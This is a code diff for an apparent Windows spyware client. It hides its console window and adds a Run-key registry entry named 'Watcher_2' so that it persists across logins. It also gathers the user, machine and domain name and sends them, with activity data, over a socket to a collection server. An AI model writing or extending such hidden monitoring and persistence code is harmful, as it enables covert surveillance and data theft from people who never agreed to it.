@@ -7,6 +7,8 @@
 #include <thread>
 #include <chrono>
 #include <vector>
+#include <lm.h>
+#pragma comment(lib, "netapi32.lib")
 
 #define SERVER_IP "127.0.0.1" 
 #define SERVER_PORT 12345
@@ -20,11 +22,26 @@ void InitializeWinsock() {
 std::string GetClientInfo() {
     char username[UNLEN + 1];
     char computerName[UNLEN + 1];
+    char domainName[MAX_PATH + 1];
     DWORD usernameLen = UNLEN + 1;
     DWORD computerNameLen = UNLEN + 1;
+    DWORD domainNameLen = MAX_PATH + 1;
+
     GetUserNameA(username, &usernameLen);
     GetComputerNameA(computerName, &computerNameLen);
-    std::string clientInfo = "User:" + std::string(username) + ", Machine:" + std::string(computerName);
+
+    LPWSTR domainNameW = NULL;
+    NETSETUP_JOIN_STATUS joinStatus;
+    if (NetGetJoinInformation(NULL, &domainNameW, &joinStatus) == NERR_Success) {
+        WideCharToMultiByte(CP_UTF8, 0, domainNameW, -1, domainName, MAX_PATH, NULL, NULL);
+        NetApiBufferFree(domainNameW);
+    }
+    else {
+        strcpy_s(domainName, MAX_PATH, "WORKGROUP");
+    }
+    std::string clientInfo = "User:" + std::string(username) +
+        ", Machine:" + std::string(computerName) +
+        ", Domain:" + std::string(domainName);
     return clientInfo;
 }
 
@@ -138,20 +155,26 @@ void SendActivityData(SOCKET clientSocket) {
     }
 }
 
-int main() {
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-
-    /* Uncomment after filling appPath
+void AddToStartup() {
     HKEY hKey;
-    const char* appPath = "\"C:\\...\"";
+    char appPath[MAX_PATH];
     const char* keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, "Watcher", 0, REG_SZ, (BYTE*)appPath, strlen(appPath) + 1);
-        RegCloseKey(hKey);
-    }
-    */
+    if (GetModuleFileNameA(NULL, appPath, MAX_PATH)) {
+        std::string quotedPath = "\"" + std::string(appPath) + "\"";
 
+        if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            RegSetValueExA(hKey, "Watcher_2", 0, REG_SZ,
+                (BYTE*)quotedPath.c_str(),
+                quotedPath.length() + 1);
+            RegCloseKey(hKey);
+        }
+    }
+}
+
+int main() {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    AddToStartup();
     InitializeWinsock();
     SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
     sockaddr_in serverAddr;
